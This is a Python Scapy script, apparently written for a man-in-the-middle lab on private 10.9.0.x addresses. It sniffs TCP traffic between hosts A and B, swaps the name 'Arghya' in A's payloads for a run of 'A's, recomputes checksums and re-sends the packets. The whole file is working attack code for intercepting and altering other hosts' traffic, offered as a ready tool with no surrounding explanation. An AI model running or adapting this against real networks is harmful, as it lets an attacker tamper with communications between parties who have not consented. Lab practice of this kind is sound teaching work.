#!/usr/bin/env python3

from scapy.all import *

# Define IP and MAC addresses for hosts A, B, and M
IP_A = "10.9.0.5"
MAC_A = "02:42:0a:09:00:05"
IP_B = "10.9.0.6"
MAC_B = "02:42:0a:09:00:06"
IP_M = "10.9.0.105"
MAC_M = "02:42:0a:09:00:69"

# Set the target name to be replaced
myname = "Arghya"
target_byte = myname.encode('utf-8')

def replace_target(pkt):
    ls(pkt)
    # Ignore packets from the attacker's machine
    if pkt[Ether].src == MAC_M:
        pass
    else:
        if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
            # Create a new packet based on the captured one
            # Remove checksums and payload for recalculation
            newpkt = IP(bytes(pkt[IP]))
            del(newpkt.chksum)
            del(newpkt[TCP].payload)
            del(newpkt[TCP].chksum)

            #################################################################
            if pkt[TCP].payload:
                data = pkt[TCP].payload.load
                decoded_payload = data.decode('utf-8')
                target_index = decoded_payload.find(myname)
                if target_index == -1: # Target name not found, send original packet
                    send(newpkt/data)
                else:
                    # Replace my name with 'A's
                    modified_payload = list(decoded_payload)
                    for i in range(len(myname)):
                        modified_payload[target_index + i] = 'A'
                    newdata = ''.join(modified_payload).encode('utf-8')
                    send(newpkt/newdata)
            else:
                send(newpkt)
            ################################################################

        elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
            newpkt = IP(bytes(pkt[IP]))
            del(newpkt.chksum)
            del(newpkt[TCP].chksum)
            send(newpkt)

# Set up packet sniffing on eth0 interface with TCP filter
f = 'tcp and (host ' + IP_A + ' or host ' + IP_B + ')'
pkt = sniff(iface='eth0', filter=f, prn=replace_target)